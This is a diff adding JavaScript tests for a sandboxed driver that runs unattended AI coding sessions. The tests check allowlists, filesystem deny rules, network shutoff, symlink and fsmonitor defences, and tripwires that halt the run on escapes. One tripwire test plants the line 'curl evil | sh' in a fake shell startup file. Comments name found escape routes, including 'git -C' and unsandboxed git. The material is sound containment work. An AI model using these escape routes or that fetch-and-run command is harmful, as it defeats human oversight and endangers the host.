+  try {
+    const out = await turbo.run(d.opts);
+    assert.strictEqual(out.sessions.length, 3);
+    assert.strictEqual(out.stopReason, 'hours');
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('driver: STOP ends the run before the next session; PAUSE holds it; a changed branch ends it', async () => {
+  const d = driverSetup([{ plan: [['status', 'a', 'done']], commit: 'a.txt', result: R('done', 'a') }], { slices: [S('a'), S('b')] });
+  try {
+    fs.writeFileSync(path.join(d.home, 'STOP'), '');
+    assert.strictEqual((await turbo.run(d.opts)).stopReason, 'stop-file');
+    fs.unlinkSync(path.join(d.home, 'STOP'));
+    fs.writeFileSync(path.join(d.home, 'PAUSE'), '');
+    const paused = await turbo.run(d.opts);
+    assert.deepStrictEqual([paused.sessions.length, paused.stopReason], [0, 'hours']);
+    fs.unlinkSync(path.join(d.home, 'PAUSE'));
+    // The fake switches branch in its first session.
+    fs.writeFileSync(d.opts.env.TURBO_FAKE, JSON.stringify([{ result: R('done', 'a') }]));
+    const sw = { ...d.opts, claudeBin: d.opts.claudeBin, beforeCheck: () => gitIn(d.root, ['checkout', '-q', '-b', 'other']) };
+    const out = await turbo.run(sw);
+    assert.strictEqual(out.stopReason, 'branch-changed');
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('driver: refuses to start while another live driver holds the lock, and clears a dead one\'s lock', async () => {
+  const d = driverSetup([], { slices: [], hours: 0 });
+  try {
+    fs.mkdirSync(path.join(d.home, 'driver'), { recursive: true });
+    fs.writeFileSync(path.join(d.home, 'driver', 'driver.lock'), JSON.stringify({ pid: process.pid, run: 'other' }));
+    await assert.rejects(() => turbo.run(d.opts), /another driver/);
+    fs.writeFileSync(path.join(d.home, 'driver', 'driver.lock'), JSON.stringify({ pid: 2147483646, run: 'dead' }));
+    assert.strictEqual((await turbo.run(d.opts)).stopReason, 'hours');
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('driver: refuses to start on a tree with uncommitted tracked changes (they belong to someone)', async () => {
+  const d = driverSetup([], { slices: [S('a')] });
+  try {
+    fs.writeFileSync(path.join(d.root, 'tracked.txt'), 'someone else\'s work\n');
+    await assert.rejects(() => turbo.run(d.opts), /uncommitted tracked changes/);
+    assert.ok(!fs.existsSync(path.join(d.home, 'driver', 'driver.lock')), 'the lock was left behind');
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('driver: a sha the session names but git does not have is not counted', async () => {
+  const d = driverSetup([{ result: R('done', 'a', { commits: ['deadbeefdeadbeef'] }) }], { slices: [S('a')], maxSessions: 1 });
+  try {
+    const out = await turbo.run(d.opts);
+    assert.deepStrictEqual(out.sessions[0].verified, []);
+    assert.deepStrictEqual(out.sessions[0].unverified, ['deadbeefdeadbeef']);
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('driver: the default referee runs leopard-check --gate on the session and reads its exit', () => {
+  const home = tmpDir();
+  try {
+    fs.writeFileSync(path.join(home, 'events.jsonl'), JSON.stringify({ ts: new Date().toISOString(), type: 'command_run', session_id: 'S9', command: 'ls' }) + '\n');
+    const v = turbo.leopardReferee('S9', { root: path.join(__dirname, '..'), orunmilaHome: home });
+    assert.strictEqual(v.shown, false, 'a session with no Slice commit is not shown');
+    assert.strictEqual(v.exit, 1);
+    assert.strictEqual(turbo.leopardReferee('nobody', { root: path.join(__dirname, '..'), orunmilaHome: home }).exit, 2);
+  } finally {
+    rmrf(home);
+  }
+});
+
+// --- T6: docs and config ------------------------------------------------------
+
+it('config: the run state folder .turbo/ is ignored by git, so a run never dirties the tree', () => {
+  const r = spawnSync('git', ['-C', path.join(__dirname, '..'), 'check-ignore', '-q', '.turbo/plan.json']);
+  assert.strictEqual(r.status, 0, '.turbo/ is not gitignored');
+});
+
+it('prompt: trailers are one block, ending with Co-Authored-By, so git (and leopard-check) can read Slice:', () => {
+  const text = session.prompt(session.promptVars({ run: 'R', session: 'S', home: '/h', assignment: { kind: 'strike' } }));
+  assert.ok(text.includes('one trailer block'), 'the prompt does not say trailers are one block');
+  // The worked example in the prompt must itself parse: its last paragraph holds Slice:.
+  const ex = text.split('```text\n')[1].split('```')[0];
+  const r = spawnSync('git', ['interpret-trailers', '--parse'], { input: ex, encoding: 'utf8' });
+  assert.ok(r.stdout.includes('Slice: T9'), `the example's trailers do not parse: ${r.stdout}`);
+});
+
+// --- T7a: what the live smoke session showed (session 95549334, Haiku) ---------
+
+it('session: StructuredOutput is allowed, or dontAsk refuses the very call that ends the session', () => {
+  assert.ok(session.settings().permissions.allow.includes('StructuredOutput'));
+});
+
+it('session: TURBO_HOME and the scratch folder are added dirs, so a redirect into them is not refused', () => {
+  const a = session.argv({ sessionId: 'S1', settingsFile: '/s', addDirs: ['/h', '/h/runs/r/scratch'] });
+  const dirs = a.map((x, i) => (x === '--add-dir' ? a[i + 1] : null)).filter(Boolean);
+  assert.deepStrictEqual(dirs, ['/h', '/h/runs/r/scratch']);
+  const i = a.indexOf('--add-dir');
+  assert.ok(a[i + 2].startsWith('--'), 'a list flag must be followed by another flag, never the end of argv');
+});
+
+it('prompt: the end is a StructuredOutput call; a refusal is queued, never asked for in chat; no echo $?', () => {
+  const text = session.prompt(session.promptVars({ run: 'R', session: 'S', home: '/h', assignment: { kind: 'strike' } }));
+  const flat = text.replace(/\s+/g, ' '); // line wrapping is not content
+  for (const must of ['StructuredOutput', 'Nobody reads this chat', 'never `; echo $?`', 'packed-refs.lock']) assert.ok(flat.includes(must), `the prompt lacks: ${must}`);
+});
+
+it('driver: the session is started with TURBO_HOME and its scratch folder as added dirs', async () => {
+  const d = driverSetup([{ result: R('nothing', null) }], { slices: [], maxSessions: 1 });
+  try {
+    const out = await turbo.run(d.opts);
+    const a = d.call(0).argv;
+    const dirs = a.map((x, i) => (x === '--add-dir' ? a[i + 1] : null)).filter(Boolean);
+    assert.deepStrictEqual(dirs, [d.home, out.scratchDir]);
+    assert.strictEqual(out.scratchDir, path.join(d.home, 'scratch', out.run));
+    assert.strictEqual(out.runDir, path.join(d.home, 'driver', out.run), 'the driver keeps its records in .turbo/driver/');
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+// --- T8: the OS sandbox as the base layer (LD113) -------------------------------
+
+it('sandbox: on, fail-closed, no unsandboxed retry, no network, nothing excluded', () => {
+  const sb = session.settings({ root: path.join(__dirname, '..') }).sandbox;
+  assert.strictEqual(sb.enabled, true);
+  assert.strictEqual(sb.failIfUnavailable, true, 'without it a session runs unsandboxed when the sandbox cannot start');
+  assert.strictEqual(sb.allowUnsandboxedCommands, false, 'dangerouslyDisableSandbox would be an escape');
+  assert.strictEqual(sb.autoAllowBashIfSandboxed, false, 'the allowlist still decides');
+  assert.ok(!sb.excludedCommands || sb.excludedCommands.length === 0, 'an excluded command runs outside the sandbox');
+  assert.deepStrictEqual(sb.network.allowedDomains, []);
+  assert.strictEqual(sb.network.strictAllowlist, true);
+});
+
+it('sandbox: in a TURBO clone, only its own git hooks and config, TURBO, .claude and the scratchpads are denied (LD116)', () => {
+  const base = fs.realpathSync(tmpDir());
+  try {
+    const root = path.join(base, 'clone');
+    fs.mkdirSync(root);
+    gitIn(root, ['init', '-q', '-b', 'work']);
+    const fsx = session.settings({ root }).sandbox.filesystem;
+    assert.deepStrictEqual(fsx.allowWrite, []);
+    for (const p of [path.join(root, '.git', 'hooks'), path.join(root, '.git', 'config'), path.join(root, '.git', 'config.lock'), path.join(root, 'scripts', 'turbo'), path.join(root, '.claude')])
+      assert.ok(fsx.denyWrite.includes(p), `denyWrite lacks ${p}`);
+    const tmp = `/private/tmp/claude-${require('os').userInfo().uid}`;
+    assert.ok(fsx.denyWrite.includes(`${tmp}/-*`));
+    const pads = fs.existsSync(tmp) ? fs.readdirSync(tmp).filter((n) => n.startsWith('-')).map((n) => path.join(tmp, n)) : [];
+    for (const p of pads) assert.ok(fsx.denyWrite.includes(p), `denyWrite lacks the scratchpad ${p}`);
+  } finally {
+    rmrf(base);
+  }
+});
+
+it('driver: refuses a linked worktree (its .git is shared with another checkout); TURBO runs in its own clone', async () => {
+  const d = driverSetup([], { slices: [S('a')] });
+  try {
+    gitIn(d.root, ['worktree', 'add', '-q', path.join(d.base, 'wt'), '-b', 'wtb']);
+    await assert.rejects(() => turbo.run({ ...d.opts, root: path.join(d.base, 'wt') }), /linked worktree/);
+    assert.ok(!fs.existsSync(path.join(d.home, 'driver', 'driver.lock')), 'the lock was left behind');
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('clone: an isolated repo on the branch, the ledger branch local, no remote, hooks settings, rule links, memory link, source recorded', () => {
+  const base = fs.realpathSync(tmpDir());
+  try {
+    const src = path.join(base, 'src');
+    fs.mkdirSync(src);
+    gitIn(src, ['init', '-q', '-b', 'work']);
+    fs.writeFileSync(path.join(src, 'f.txt'), 'f\n');
+    gitIn(src, ['add', 'f.txt']);
+    gitIn(src, ['commit', '-q', '-m', 'base']);
+    gitIn(src, ['branch', 'output-1']);
+    fs.mkdirSync(path.join(src, '.claude'));
+    fs.writeFileSync(path.join(src, '.claude', 'settings.local.json'), '{"hooks":{}}\n');
+    fs.writeFileSync(path.join(base, 'rules.md'), 'rules\n');
+    fs.symlinkSync(path.join(base, 'rules.md'), path.join(src, 'CLAUDE.md'));
+    const mem = path.join(base, 'memory');
+    fs.mkdirSync(mem);
+    const claudeHome = path.join(base, 'claude-home');
+    const dest = path.join(base, 'turbo-clone');
+    turbo.cloneRepo({ source: src, dest, branch: 'work', claudeHome, memoryFrom: mem });
+    const g = (...a) => gitIn(dest, a).stdout.trim();
+    assert.strictEqual(fs.realpathSync(path.resolve(dest, g('rev-parse', '--git-common-dir'))), path.join(fs.realpathSync(dest), '.git'));
+    assert.strictEqual(g('symbolic-ref', '--short', 'HEAD'), 'work');
+    assert.strictEqual(g('rev-parse', 'output-1'), gitIn(src, ['rev-parse', 'output-1']).stdout.trim());
+    assert.strictEqual(g('remote'), '', 'the clone has a remote');
+    assert.strictEqual(g('config', '--get', 'turbo.source'), fs.realpathSync(src));
+    assert.strictEqual(fs.readFileSync(path.join(dest, '.claude', 'settings.local.json'), 'utf8'), '{"hooks":{}}\n');
+    assert.strictEqual(fs.readlinkSync(path.join(dest, 'CLAUDE.md')), path.join(base, 'rules.md'));
+    const key = fs.realpathSync(dest).replace(/[^A-Za-z0-9]/g, '-');
+    assert.strictEqual(fs.readlinkSync(path.join(claudeHome, 'projects', key, 'memory')), mem);
+    assert.throws(() => turbo.cloneRepo({ source: src, dest, branch: 'work', claudeHome }), /exists/);
+  } finally {
+    rmrf(base);
+  }
+});
+
+it('clone: a shallow source gives a clone whose history git can walk (the live repo is shallow)', () => {
+  const base = fs.realpathSync(tmpDir());
+  try {
+    const full = path.join(base, 'full');
+    fs.mkdirSync(full);
+    gitIn(full, ['init', '-q', '-b', 'work']);
+    for (const n of ['1', '2', '3']) {
+      fs.writeFileSync(path.join(full, 'f.txt'), n);
+      gitIn(full, ['add', 'f.txt']);
+      gitIn(full, ['commit', '-q', '-m', `c${n}`]);
+    }
+    const shallow = path.join(base, 'shallow');
+    assert.strictEqual(spawnSync('git', ['clone', '-q', '--depth', '1', '--branch', 'work', `file://${full}`, shallow]).status, 0);
+    assert.ok(fs.existsSync(path.join(shallow, '.git', 'shallow')), 'the test source is not shallow');
+    // The source is a linked worktree of the shallow repo, as orunmila-dev is of the live copy:
+    // its shallow file is in the common dir, which a local clone from the worktree path misses.
+    const wt = path.join(base, 'wt');
+    assert.strictEqual(gitIn(shallow, ['worktree', 'add', '-q', '-b', 'dev', wt]).status, 0);
+    const dest = path.join(base, 'turbo-clone');
+    turbo.cloneRepo({ source: wt, dest, branch: 'dev', claudeHome: path.join(base, 'ch') });
+    // Before the fix: "Failed to traverse parents" (the live clone's referee died on it, run 20261122T021632Z).
+    assert.strictEqual(gitIn(dest, ['log', '--all', '--format=%h']).status, 0, gitIn(dest, ['log', '--all']).stderr);
+  } finally {
+    rmrf(base);
+  }
+});
+
+// --- T13: the driver's own boundary (LD117) ---------------------------------------
+
+it('T13 referee: runs leopard-check code loaded at start, not the file a session can edit later', () => {
+  const base = fs.realpathSync(tmpDir());
+  try {
+    const mirror = path.join(base, 'm');
+    fs.mkdirSync(path.join(mirror, 'scripts', 'turbo'), { recursive: true });
+    const R0 = path.join(__dirname, '..');
+    for (const f of ['turbo.js', 'plan.js', 'session.js', 'guard.js', 'watch.js', 'prompt.md']) fs.copyFileSync(path.join(R0, 'scripts', 'turbo', f), path.join(mirror, 'scripts', 'turbo', f));
+    fs.mkdirSync(path.join(mirror, 'src', 'capture', 'fs-sentinel'), { recursive: true });
+    fs.copyFileSync(path.join(R0, 'src', 'capture', 'fs-sentinel', 'ignore.js'), path.join(mirror, 'src', 'capture', 'fs-sentinel', 'ignore.js'));
+    fs.copyFileSync(path.join(R0, 'scripts', 'leopard-check.js'), path.join(mirror, 'scripts', 'leopard-check.js'));
+    const t = require(path.join(mirror, 'scripts', 'turbo', 'turbo.js'));
+    const marker = path.join(base, 'ESCAPED');
+    // A session's edit, after the driver started.
+    fs.writeFileSync(path.join(mirror, 'scripts', 'leopard-check.js'), `require('fs').writeFileSync(${JSON.stringify(marker)}, 'ran');\n`);
+    const home = path.join(base, 'oh');
+    fs.mkdirSync(home);
+    fs.writeFileSync(path.join(home, 'events.jsonl'), JSON.stringify({ ts: new Date().toISOString(), type: 'command_run', session_id: 'S9', command: 'ls' }) + '\n');
+    const v = t.leopardReferee('S9', { root: R0, orunmilaHome: home });
+    assert.ok(!fs.existsSync(marker), 'the referee ran the edited file');
+    assert.strictEqual(v.shown, false);
+  } finally {
+    rmrf(base);
+  }
+});
+
+it('T13 sandbox: the driver folder, O\'s inbox, STOP and PAUSE are denied to sessions', () => {
+  const sb = session.settings({ root: path.join(__dirname, '..'), home: '/h/.turbo' }).sandbox.filesystem;
+  for (const p of ['/h/.turbo/driver', '/h/.turbo/inbox.md', '/h/.turbo/STOP', '/h/.turbo/PAUSE']) assert.ok(sb.denyWrite.includes(p), `denyWrite lacks ${p}`);
+});
+
+it('T13 guard: file tools write only in the clone, TURBO_HOME and scratch; never O\'s inbox or the driver folder', () => {
+  const { base, ctx } = guardCtx();
+  try {
+    const env = { TURBO_ROOT: ctx.root, TURBO_LIVE: ctx.live, TURBO_HOME: ctx.home, TURBO_SCRATCH: ctx.scratch.join(path.delimiter) };
+    const c = guard.contextFromEnv(env);
+    const d = (p) => guard.decide({ cwd: ctx.root, tool_name: 'Write', tool_input: { file_path: p } }, c);
+    assert.strictEqual(d(path.join(require('os').tmpdir(), 'x.txt')).kind, 'outside-tree', 'the temp dir is open to file tools');
+    assert.strictEqual(d('/private/tmp/claude-505/-Users-x/y.txt').kind, 'outside-tree');
+    assert.strictEqual(d(path.join(ctx.home, 'inbox.md')).kind, 'o-inbox');
+    assert.strictEqual(d(path.join(ctx.home, 'STOP')).kind, 'o-inbox');
+    assert.strictEqual(d(path.join(ctx.home, 'driver', 'r', 'summary.md')).kind, 'self-edit');
+    assert.ok(d(path.join(ctx.home, 'plan-notes.md')).allow);
+  } finally {
+    rmrf(base);
+  }
+});
+
+it('T13 driver: runs only in a TURBO clone (turbo.source set), refuses a symlinked driver folder or plan.json', async () => {
+  const d = driverSetup([], { slices: [S('a')], hours: 0 });
+  try {
+    gitIn(d.root, ['config', '--unset', 'turbo.source']);
+    await assert.rejects(() => turbo.run(d.opts), /TURBO clone/);
+    gitIn(d.root, ['config', 'turbo.source', d.base]);
+    const victim = path.join(d.base, 'victim');
+    fs.mkdirSync(victim);
+    fs.symlinkSync(victim, path.join(d.home, 'driver'));
+    await assert.rejects(() => turbo.run(d.opts), /symlink/);
+    assert.deepStrictEqual(fs.readdirSync(victim), [], 'the driver wrote through the symlink');
+    fs.unlinkSync(path.join(d.home, 'driver'));
+    fs.symlinkSync(path.join(d.base, 'nowhere', 'yet'), path.join(d.home, 'driver'));
+    await assert.rejects(() => turbo.run(d.opts), /symlink/, 'a dangling symlink passed the check');
+    fs.unlinkSync(path.join(d.home, 'driver'));
+    const pj = path.join(d.home, 'plan.json');
+    fs.renameSync(pj, path.join(d.base, 'plan-real.json'));
+    fs.symlinkSync(path.join(d.base, 'plan-real.json'), pj);
+    assert.throws(() => plan.load(d.home), /symlink/);
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('T13 plan.save: a planted temp-file symlink is not written through', () => {
+  const home = fs.realpathSync(tmpDir());
+  try {
+    const victim = path.join(home, 'victim.txt');
+    fs.writeFileSync(victim, 'keep\n');
+    fs.symlinkSync(victim, path.join(home, `.plan.json.${process.pid}.tmp`));
+    plan.save(home, plan.empty());
+    assert.strictEqual(fs.readFileSync(victim, 'utf8'), 'keep\n');
+    assert.deepStrictEqual(plan.load(home), plan.empty());
+  } finally {
+    rmrf(home);
+  }
+});
+
+it('T13 driver: its git status does not run the repo\'s core.fsmonitor (since T20 it refuses that config outright)', async () => {
+  const d = driverSetup([{ result: R('nothing', null) }], { slices: [], maxSessions: 1 });
+  try {
+    const marker = path.join(d.base, 'FSMONITOR-RAN');
+    const hook = path.join(d.base, 'fsm.sh');
+    fs.writeFileSync(hook, `#!/bin/sh\ntouch ${marker}\n`);
+    fs.chmodSync(hook, 0o755);
+    gitIn(d.root, ['config', 'core.fsmonitor', hook]);
+    await assert.rejects(() => turbo.run(d.opts), /core\.fsmonitor/);
+    assert.ok(!fs.existsSync(marker), 'the driver ran the repo\'s fsmonitor');
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('T13 prompt: gates run alone with no redirect (dontAsk refuses every redirect)', () => {
+  const flat = session.prompt(session.promptVars({ run: 'R', session: 'S', home: '/h', assignment: { kind: 'strike' } })).replace(/\s+/g, ' ');
+  assert.ok(flat.includes('with no redirect'), 'the prompt still tells sessions to redirect gates');
+  assert.ok(!flat.includes('> {{HOME}}') && !flat.includes('> /h/test.txt'), 'the prompt still shows a redirect');
+});
+
+it('T14 sandbox: FSEvents and local binding are open so the suite runs in a session; the network stays closed', () => {
+  // Under the sandbox without them npm test gave 36/40 suites: fs.watch never delivered, the
+  // dashboard could not listen (run 20261122T024855Z); with them the four failing suites passed (825dcaf5).
+  const n = session.settings({ root: path.join(__dirname, '..') }).sandbox.network;
+  assert.deepStrictEqual(n.allowMachLookup, ['com.apple.FSEvents']);
+  assert.strictEqual(n.allowLocalBinding, true);
+  assert.deepStrictEqual(n.allowedDomains, []);
+  assert.strictEqual(n.strictAllowlist, true);
+});
+
+it('T14 prompt: never run a gate in the background (NF66: it is recorded as passed at launch)', () => {
+  const flat = session.prompt(session.promptVars({ run: 'R', session: 'S', home: '/h', assignment: { kind: 'strike' } })).replace(/\s+/g, ' ');
+  assert.ok(flat.includes('never in the background'), 'the prompt does not forbid background gate runs');
+});
+
+it('T15 prompt: lists the allowed Bash commands from the allowlist itself, and says a refusal covers one command', () => {
+  // Run 20261122T025630Z: Sonnet used `git -C <path>` (not allowed), took three refusals for "all Bash
+  // is denied" and gave up the slice.
+  const text = session.prompt(session.promptVars({ run: 'R', session: 'S', home: '/h', assignment: { kind: 'strike' } }));
+  for (const c of session.BASH_ALLOW) assert.ok(text.includes(`\`${c}\``), `the prompt does not list ${c}`);
+  const flat = text.replace(/\s+/g, ' ');
+  assert.ok(flat.includes('without `-C`'), 'the prompt does not say to run git without -C');
+  assert.ok(flat.includes('covers that one command'), 'the prompt does not say a refusal covers one command');
+});
+
+it('T16 clone: links the source\'s node_modules (lint and coverage need its tools); the prompt\'s peer check uses no ps', () => {
+  // Run 20261122T030120Z: eslint and c8 "command not found" in the clone, so the session queued Q1.
+  const base = fs.realpathSync(tmpDir());
+  try {
+    const src = path.join(base, 'src');
+    fs.mkdirSync(path.join(src, 'node_modules', '.bin'), { recursive: true });
+    gitIn(src, ['init', '-q', '-b', 'work']);
+    fs.writeFileSync(path.join(src, '.gitignore'), 'node_modules/\n');
+    gitIn(src, ['add', '.gitignore']);
+    gitIn(src, ['commit', '-q', '-m', 'base']);
+    const dest = path.join(base, 'turbo-clone');
+    turbo.cloneRepo({ source: src, dest, branch: 'work', claudeHome: path.join(base, 'ch') });
+    assert.strictEqual(fs.readlinkSync(path.join(dest, 'node_modules')), path.join(src, 'node_modules'));
+    assert.strictEqual(gitIn(dest, ['status', '--porcelain']).stdout, '', 'the link dirties the clone');
+  } finally {
+    rmrf(base);
+  }
+  // The sandbox refuses ps ("operation not permitted", same run); in a clone the driver's lock rules out a peer.
+  const flat = session.prompt(session.promptVars({ run: 'R', session: 'S', home: '/h', assignment: { kind: 'strike' } })).replace(/\s+/g, ' ');
+  assert.ok(!flat.includes('ps -axo'), 'the prompt still asks for ps');
+});
+
+it('T17 driver: refuses to start until O lifts the hold (cold verify 5 found escapes through unsandboxed git)', async () => {
+  const d = driverSetup([], { slices: [S('a')], hours: 0 });
+  try {
+    await assert.rejects(() => turbo.run({ ...d.opts, held: true }), /on hold/);
+    assert.ok(!fs.existsSync(path.join(d.home, 'driver')), 'a held run left a driver folder');
+    assert.strictEqual(turbo.HOLD.lifted, false, 'the hold is lifted in the code');
+    const readme = fs.readFileSync(path.join(__dirname, '..', 'scripts', 'turbo', 'README.md'), 'utf8');
+    assert.ok(readme.split('\n').slice(0, 12).join(' ').includes('ON HOLD'), 'the README does not open with the hold');
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('driver: a HEAD reflog entry that is not a commit (a checkout, even one put back) makes the next session a recovery', async () => {
+  const steps = [{ result: R('nothing', null), checkoutAndBack: true }, { result: R('recovered', null) }];
+  const d = driverSetup(steps, { slices: [S('a')], maxSessions: 2 });
+  try {
+    const out = await turbo.run(d.opts);
+    assert.deepStrictEqual(out.sessions.map((s) => s.kind), ['strike', 'recover']);
+    assert.deepStrictEqual(out.sessions[0].headMoves, ['checkout', 'checkout']);
+    assert.ok(d.call(1).stdin.includes('checkout'), 'the recovery prompt names the HEAD movement');
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('allowlist: git -C is gone (it let any git subcommand past layer 1)', () => {
+  assert.ok(!session.settings({ root: '/r' }).permissions.allow.includes('Bash(git -C:*)'));
+});
+
+// --- T18-T21: an escape shows up and stops the run (LD125-LD130) ---------------------
+
+const watch = require('../scripts/turbo/watch');
+const ORUNMILA_BIN = path.join(__dirname, '..', 'bin', 'orunmila.js');
+const pause = (ms) => new Promise((r) => setTimeout(r, ms));
+
+/** Run a real Sentinel on each root (events to ohome) while fn runs; return the log's rows. */
+async function sentinelRecord(roots, ohome, fn, settleMs = 1500) {
+  const kids = roots.map((root, i) => {
+    const errFile = path.join(ohome, `sentinel-${i}.err`);
+    const fd = fs.openSync(errFile, 'w');
+    const child = require('child_process').spawn(process.execPath, [ORUNMILA_BIN, 'watch-fs', '--root', root], { stdio: ['ignore', 'ignore', fd], env: { ...process.env, ORUNMILA_HOME: ohome } });
+    fs.closeSync(fd);
+    return { child, errFile };
+  });
+  try {
+    for (const k of kids) for (let i = 0; i < 100 && !fs.readFileSync(k.errFile, 'utf8').includes('[fs-sentinel] watching'); i++) await pause(100);
+    await fn();
+    await pause(settleMs);
+  } finally {
+    await Promise.all(kids.map((k) => new Promise((r) => (k.child.exitCode !== null ? r() : (k.child.once('exit', r), k.child.kill('SIGINT'))))));
+  }
+  const log = path.join(ohome, 'events.jsonl');
+  return fs.existsSync(log) ? fs.readFileSync(log, 'utf8').split('\n').filter(Boolean).map(JSON.parse) : [];
+}
+
+it('T18 Sentinel: with the ignore file the driver writes, a write in .turbo/ or a build folder has a disk record; without it, none', async () => {
+  const base = fs.realpathSync(tmpDir());
+  try {
+    const watched = path.join(base, 'with');
+    const control = path.join(base, 'without');
+    for (const r of [watched, control]) fs.mkdirSync(path.join(r, '.turbo', 'scratch'), { recursive: true });
+    watch.writeSentinelIgnore(watched);
+    const ohome = path.join(base, 'oh');
+    fs.mkdirSync(ohome);
+    const rows = await sentinelRecord([watched, control], ohome, () => {
+      for (const r of [watched, control]) {
+        fs.writeFileSync(path.join(r, '.turbo', 'scratch', 's.txt'), 's\n');
+        fs.mkdirSync(path.join(r, 'build'));
+        fs.writeFileSync(path.join(r, 'build', 'b.txt'), 'b\n');
+      }
+    });
+    const seen = (r) => [...new Set(rows.filter((e) => e.source === 'fs-sentinel' && e.path.startsWith(r + path.sep)).map((e) => path.relative(r, e.path)))].sort();
+    assert.deepStrictEqual(seen(watched), [path.join('.turbo', 'scratch', 's.txt'), path.join('build', 'b.txt')]);
+    assert.deepStrictEqual(seen(control), [], 'the control root recorded a write its defaults ignore, so the test proves nothing');
+  } finally {
+    rmrf(base);
+  }
+});
+
+/** A fake Sentinel: records its argv and whether the ignore file was there, prints the ready line unless told not to. */
+function fakeSentinel(base, { ready = true } = {}) {
+  const rec = path.join(base, 'sentinel-rec.json');
+  const bin = path.join(base, ready ? 'sentinel-fake' : 'sentinel-mute');
+  fs.writeFileSync(
+    bin,
+    `#!/usr/bin/env node\nconst fs = require('fs');\nconst path = require('path');\nconst root = process.argv[4];\n` +
+      `process.on('SIGINT', () => { fs.writeFileSync(${JSON.stringify(rec)} + '.stopped', 'SIGINT'); process.exit(0); });\n` +
+      `fs.writeFileSync(${JSON.stringify(rec)}, JSON.stringify({ argv: process.argv.slice(2), ignore: fs.existsSync(path.join(root, '.orunmila', 'ignore')) ? fs.readFileSync(path.join(root, '.orunmila', 'ignore'), 'utf8') : null }));\n` +
+      (ready ? `process.stderr.write('[fs-sentinel] watching ' + root + ' (1 dirs, 0 files baselined)\\n');\n` : '') +
+      `setInterval(() => {}, 1000);\n`,
+  );
+  fs.chmodSync(bin, 0o755);
+  return { bin, rec };
+}
+
+it('T18 driver: writes the ignore file, starts its own Sentinel on the clone even when one watches, and waits for its first walk', async () => {
+  const d = driverSetup([{ result: R('nothing', null) }], { slices: [], maxSessions: 1 });
+  try {
+    const f = fakeSentinel(d.base);
+    const out = await turbo.run({ ...d.opts, sentinel: true, sentinelBin: f.bin, sentinelRunning: () => true });
+    for (let i = 0; i < 50 && !fs.existsSync(`${f.rec}.stopped`); i++) await pause(100);
+    const rec = JSON.parse(fs.readFileSync(f.rec, 'utf8'));
+    assert.deepStrictEqual(rec.argv, ['watch-fs', '--root', d.root]);
+    assert.ok(rec.ignore && rec.ignore.split('\n').includes('!.turbo/'), `the Sentinel started before the ignore file was written: ${rec.ignore}`);
+    assert.strictEqual(fs.readFileSync(`${f.rec}.stopped`, 'utf8'), 'SIGINT', 'the Sentinel was not stopped at the end');
+    const summary = fs.readFileSync(path.join(out.runDir, 'summary.md'), 'utf8');
+    assert.ok(summary.includes('Sentinel: started'), summary);
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+it('T18 driver: refuses to run when its Sentinel never finishes its first walk (no disk record, no run)', async () => {
+  const d = driverSetup([{ result: R('nothing', null) }], { slices: [], maxSessions: 1 });
+  try {
+    const f = fakeSentinel(d.base, { ready: false });
+    await assert.rejects(() => turbo.run({ ...d.opts, sentinel: true, sentinelBin: f.bin, sentinelReadyMs: 1500 }), /did not finish its first walk/);
+    assert.ok(!fs.existsSync(`${d.opts.env.TURBO_FAKE}.call0.json`), 'a session ran without a ready Sentinel');
+    assert.ok(!fs.existsSync(path.join(d.home, 'driver', 'driver.lock')), 'the lock was left behind');
+    for (let i = 0; i < 50 && !fs.existsSync(`${f.rec}.stopped`); i++) await pause(100);
+    assert.ok(fs.existsSync(`${f.rec}.stopped`), 'the Sentinel that never got ready was left running');
+  } finally {
+    rmrf(d.base);
+  }
+});
+
+/** The run halted on an escape check: no next session, HALT.json, a blocking discrepancy item, and a later run refuses. */
+async function expectHalt(d, out, check, needle) {
+  assert.strictEqual(out.stopReason, 'escape-check', `the run did not halt: ${out.stopReason}`);
+  assert.ok(!d.called(1), 'a session started after the escape');
+  const halt = JSON.parse(fs.readFileSync(path.join(d.home, 'driver', 'HALT.json'), 'utf8'));
+  assert.ok(
+    halt.findings.some((f) => f.check === check && f.detail.includes(needle)),
+    `no ${check} finding naming ${needle}: ${JSON.stringify(halt.findings)}`,
+  );
+  const q = plan.load(d.home).queue.find((x) => x.kind === 'discrepancy');
+  assert.ok(q && q.blocking && q.status === 'open', 'no open blocking discrepancy item for O');
+  const summary = fs.readFileSync(path.join(out.runDir, 'summary.md'), 'utf8');
+  assert.ok(summary.includes('HALTED') && summary.includes(needle), summary);
+  await assert.rejects(() => turbo.run(d.opts), /halted/, 'a later run started over an unread halt');
+}
+
+it('T19 tripwire: a session that changes a file outside the clone that runs code as O halts the run', async () => {
+  const d0 = driverSetup([], {});
+  const rc = path.join(d0.base, 'o-home', '.zshrc');
+  fs.mkdirSync(path.dirname(rc));
+  fs.writeFileSync(rc, 'export PATH=/usr/bin\n');
+  const d = driverSetup([{ writeFiles: { [rc]: 'curl evil | sh\n' }, result: R('done', 'a') }, { result: R('nothing', null) }], { slices: [S('a')], tripwire: [rc] });
+  try {
+    const out = await turbo.run(d.opts);
+    await expectHalt(d, out, 'tripwire', rc);
+  } finally {
+    rmrf(d.base);
+    rmrf(d0.base);
+  }
+});
+
+it('T19 tripwire: a change another session recorded writing (a peer\'s memory note) does not halt the run', async () => {
+  const d0 = driverSetup([], {});
+  const note = path.join(d0.base, 'memory', 'note.md');
+  fs.mkdirSync(path.dirname(note));
+  fs.writeFileSync(note, 'one\n');
+  const steps = [{ writeFiles: { [note]: 'two\n' }, appendLog: [{ session_id: 'peer-1', type: 'file_write', source: 'hook', path: note }], result: R('nothing', null) }];
+  const d = driverSetup(steps, { slices: [], tripwire: [path.dirname(note)], maxSessions: 1 });
+  try {
+    const out = await turbo.run(d.opts);
+    assert.strictEqual(out.stopReason, 'max-sessions', JSON.stringify(out.sessions[0].checks));
+    assert.deepStrictEqual(out.sessions[0].checks.tripwire, { paths: 1, changed: 1, explained: 1 });
+  } finally {
+    rmrf(d.base);
